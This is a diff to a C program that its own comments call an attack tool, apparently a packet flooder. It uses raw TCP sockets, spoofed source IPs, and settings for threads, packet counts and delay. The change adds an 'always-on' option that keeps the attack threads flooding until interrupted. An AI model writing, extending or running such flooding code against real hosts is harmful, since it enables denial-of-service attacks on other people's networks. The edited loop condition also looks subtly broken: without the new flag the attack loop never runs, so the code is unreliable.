@@ -15,6 +15,7 @@
 
 // 全局变量，用于控制攻击线程
 volatile int attack_running = 1;
+int always_on = 0;
 int quiet_mode = 0;
 
 
@@ -171,7 +172,7 @@ struct attack_params {
 };
 // 攻击线程函数
 void *attack_thread(void *arg) {
-	while (attack_running) {
+	while (always_on && attack_running) {
 		struct attack_params *params = (struct attack_params *)arg;
 
 		int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -246,7 +247,7 @@ void print_usage(const char *program_name) {
 	printf("  -t <threads>    Number of threads (default: 1)\n");
 	printf("  -d <delay>      Delay between packets in ms (default: 0)\n");
 	printf("  -s              Enable IP spoofing\n");
-	printf("  -q              Enable quiet mode (suppress output)\n");
+	printf("  -a              Enable always-on mode (Ctrl-C to stop)\n");
 	printf("  -q              Enable quiet mode (suppress output)\n");
 	printf("  -h              Show this help message\n");
 }
@@ -271,7 +272,7 @@ int main(int argc, char *argv[]) {
 	int opt;
 	argc -= 2;
 	argv += 2;
-	while ((opt = getopt(argc, argv, "p:t:d:sqh")) != -1) {
+	while ((opt = getopt(argc, argv, "p:t:d:sqah")) != -1) {
 		switch (opt) {
 		case 'p':
 			packet_count = atoi(optarg);
@@ -288,6 +289,10 @@ int main(int argc, char *argv[]) {
 		case 's':
 			use_ip_spoofing = 1;
 			printf("启用IP伪装\n");
+			break;
+		case 'a':
+			always_on = 1;
+			printf("启用持续攻击 (Ctrl-C 退出)\n");
 			break;
 		case 'q':
 			quiet_mode = 1;
